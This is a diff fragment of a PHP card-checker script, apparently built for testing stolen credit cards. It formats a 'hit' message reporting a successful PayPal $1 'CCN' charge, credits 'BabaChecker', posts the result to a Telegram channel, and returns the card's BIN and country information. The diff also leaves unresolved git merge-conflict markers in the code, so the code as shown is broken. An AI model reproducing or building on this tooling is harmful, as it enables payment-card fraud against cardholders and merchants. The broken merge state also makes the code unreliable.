@@ -237,7 +237,11 @@ if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, '
                      "<b>Response ➜</b> {$err} 🎉\n" .
                      "<b>Gateway ➜</b> PayPal 1$ CCN\n" .
                      "━━━━━━━━\n" .
+<<<<<<< HEAD
                      "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
+=======
+                     "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'charge',
@@ -372,4 +376,8 @@ if (stripos($response, '"status":"COMPLETED"') !== false || stripos($response, '
         'country_info' => $binInfo['country_info']
     ]);
     exit;
+<<<<<<< HEAD
 }
+=======
+}
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
